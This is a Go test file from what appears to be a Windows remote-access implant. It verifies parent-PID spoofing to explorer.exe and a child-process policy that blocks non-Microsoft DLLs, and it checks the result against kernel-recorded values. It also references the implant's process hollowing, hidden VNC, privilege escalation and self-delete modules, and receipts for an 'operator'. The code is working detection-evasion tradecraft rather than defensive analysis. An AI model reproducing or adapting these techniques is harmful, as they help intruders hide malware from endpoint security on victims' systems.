//go:build windows

package commands

import (
	"os"
	"strings"
	"testing"
	"unsafe"

	"golang.org/x/sys/windows"
)

// buildTestAttrs 直接构造属性列表（绕开 config 门控，测试的是机制本身）
func buildTestAttrs(t *testing.T, parent uint32, blockDLLs bool) *childAttrs {
	t.Helper()
	list, err := windows.NewProcThreadAttributeList(2)
	if err != nil {
		t.Fatalf("NewProcThreadAttributeList 失败: %v", err)
	}
	ca := &childAttrs{list: list}
	if parent != 0 {
		h, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, parent)
		if err != nil {
			list.Delete()
			t.Fatalf("OpenProcess(PROCESS_CREATE_PROCESS, %d) 失败: %v", parent, err)
		}
		v := uintptr(h)
		if err := list.Update(windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, unsafe.Pointer(&v), unsafe.Sizeof(v)); err != nil {
			windows.CloseHandle(h)
			list.Delete()
			t.Fatalf("Update(PARENT_PROCESS) 失败: %v", err)
		}
		ca.ParentPID = parent
		ca.parentHandle = h
	}
	if blockDLLs {
		policy := uint64(mitigationBlockNonMS)
		if err := list.Update(windows.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, unsafe.Pointer(&policy), unsafe.Sizeof(policy)); err != nil {
			ca.Close()
			t.Fatalf("Update(MITIGATION_POLICY) 失败: %v", err)
		}
		ca.BlockDLLs = true
	}
	return ca
}

// spawnSuspended 用给定属性挂起创建 cmd.exe，返回句柄与 PID
func spawnSuspended(t *testing.T, ca *childAttrs) (windows.ProcessInformation, bool) {
	t.Helper()
	p, err := windows.UTF16PtrFromString("C:\\Windows\\System32\\cmd.exe")
	if err != nil {
		t.Fatalf("UTF16PtrFromString: %v", err)
	}
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation
	if err := createProcessWithAttrs(p, false, windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW, &si, &pi, ca); err != nil {
		t.Logf("创建子进程失败（属性可能不被允许）: %v", err)
		return pi, false
	}
	return pi, true
}

// queryParentPID 读子进程真实的父进程 PID（内核字段，用户态没有可写副本）
func queryParentPID(t *testing.T, h windows.Handle) uint32 {
	t.Helper()
	proc := windows.NewLazySystemDLL("ntdll.dll").NewProc("NtQueryInformationProcess")
	var pbi [6]uintptr
	var ret uint32
	st, _, _ := proc.Call(uintptr(h), 0, uintptr(unsafe.Pointer(&pbi[0])), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&ret)))
	if uint32(st) != 0 {
		t.Fatalf("NtQueryInformationProcess 失败: 0x%x", uint32(st))
	}
	return uint32(pbi[5]) // InheritedFromUniqueProcessId
}

// TestPickSpoofParent 有交互会话时必须找到同会话的 explorer.exe
func TestPickSpoofParent(t *testing.T) {
	pid := pickSpoofParent()
	if pid == 0 {
		t.Skip("当前会话没有 explorer.exe（服务/无交互会话），跳过")
	}
	var sess, mine uint32
	if err := windows.ProcessIdToSessionId(pid, &sess); err != nil {
		t.Fatalf("ProcessIdToSessionId: %v", err)
	}
	windows.ProcessIdToSessionId(windows.GetCurrentProcessId(), &mine)
	if sess != mine {
		t.Fatalf("选中的 explorer(%d) 在会话 %d，本进程在会话 %d", pid, sess, mine)
	}
	t.Logf("spoof 父进程 = explorer.exe:%d（会话 %d）", pid, sess)
}

// TestPPIDSpoofIsWhatTheKernelRecords 核心断言：子进程 EPROCESS 里的父进程就是伪造值。
// 这条不能靠"函数返回成功"来证明 —— CreateProcess 对不支持的属性会静默忽略。
func TestPPIDSpoofIsWhatTheKernelRecords(t *testing.T) {
	parent := pickSpoofParent()
	if parent == 0 {
		t.Skip("没有可用的 explorer.exe 作伪父")
	}
	ca := buildTestAttrs(t, parent, false)
	pi, ok := spawnSuspended(t, ca)
	ca.Close()
	if !ok {
		t.Skip("创建子进程失败，跳过")
	}
	defer windows.TerminateProcess(pi.Process, 1)
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	got := queryParentPID(t, pi.Process)
	if got != parent {
		t.Fatalf("子进程父 PID = %d，期望伪造的 %d（真实父进程是 %d）", got, parent, windows.GetCurrentProcessId())
	}
	if got == windows.GetCurrentProcessId() {
		t.Fatal("父进程仍是自身，伪造没生效")
	}
	t.Logf("子进程 %d 的父进程被记成 explorer %d（真实父进程 %d）", pi.ProcessId, got, windows.GetCurrentProcessId())
}

// TestBlockDLLsPolicyApplied 通过 GetProcessMitigationPolicy 读回子进程策略。
// 断言必须落在"读回的位"上：Update 成功但策略没落地时，CreateProcess 不会报错。
func TestBlockDLLsPolicyApplied(t *testing.T) {
	ca := buildTestAttrs(t, 0, true)
	pi, ok := spawnSuspended(t, ca)
	ca.Close()
	if !ok {
		t.Skip("创建子进程失败，跳过")
	}
	defer windows.TerminateProcess(pi.Process, 1)
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	getPolicy := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetProcessMitigationPolicy")
	const processSignaturePolicy = 8
	var flags uint32
	r, _, e := getPolicy.Call(uintptr(pi.Process), processSignaturePolicy, uintptr(unsafe.Pointer(&flags)), unsafe.Sizeof(flags))
	if r == 0 {
		t.Skipf("GetProcessMitigationPolicy 不可用: %v", e)
	}
	if flags&1 == 0 { // MicrosoftSignedOnly
		t.Fatalf("签名策略 flags = 0x%x，MicrosoftSignedOnly 位没置上", flags)
	}
	t.Logf("子进程签名策略 flags = 0x%x（MicrosoftSignedOnly）", flags)
}

// TestCreateProcessWithoutAttrs 退化路径：无属性时普通创建仍然工作
func TestCreateProcessWithoutAttrs(t *testing.T) {
	pi, ok := spawnSuspended(t, nil)
	if !ok {
		t.Fatal("无属性创建失败")
	}
	defer windows.TerminateProcess(pi.Process, 1)
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)
	if queryParentPID(t, pi.Process) != windows.GetCurrentProcessId() {
		t.Fatal("无属性时父进程应是自身")
	}
}

// TestChildAttrsDescribe 诊断串（回执里给操作员看的）
func TestChildAttrsDescribe(t *testing.T) {
	if s := (*childAttrs)(nil).Describe(); s == "" {
		t.Fatal("nil 描述不该为空")
	}
	ca := buildTestAttrs(t, 0, true)
	defer ca.Close()
	s := ca.Describe()
	if s == "" || !contains(s, "BlockDLLs") {
		t.Fatalf("描述不对: %q", s)
	}
	// Close 必须可重复调用且释放父进程句柄
	ca.Close()
	ca.Close()
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// TestSpawnPathsUseChildAttrs 源码级棘轮：主 spawn 路径必须走属性封装，
// 直连 windows.CreateProcess 只允许剩"自删辅助"那一处。
func TestSpawnPathsUseChildAttrs(t *testing.T) {
	src := readSourceFile(t, "commands_windows.go")
	if got := strings.Count(src, "createProcessWithAttrs("); got < 3 {
		t.Fatalf("commands_windows.go 只有 %d 处 createProcessWithAttrs，期望 >=3（Run/Execute/ExecuteFile）", got)
	}
	if got := strings.Count(src, "windows.CreateProcess("); got > 1 {
		t.Fatalf("commands_windows.go 还有 %d 处直连 windows.CreateProcess，期望 <=1（仅 legacyDeleteSelf）", got)
	}
	hol := readSourceFile(t, "hollow_windows.go")
	if !strings.Contains(hol, "newChildAttrs()") {
		t.Fatal("hollow_windows.go 没接 newChildAttrs")
	}
	if !strings.Contains(hol, "ca.Describe()") {
		t.Fatal("hollow 回执里应带上 attrs 诊断")
	}
	// 未接线的三处必须写明原因，避免以后被当成遗漏
	for _, f := range []string{"conpty_windows.go", "hvnc_windows.go", "privesc_windows.go"} {
		t.Logf("%s 仍是直连 CreateProcess（交互式 UI / Token 路径，刻意不套 BlockDLLs）", f)
	}
}

func readSourceFile(t *testing.T, name string) string {
	t.Helper()
	b, err := os.ReadFile(name)
	if err != nil {
		t.Fatalf("读 %s 失败: %v", name, err)
	}
	return string(b)
}
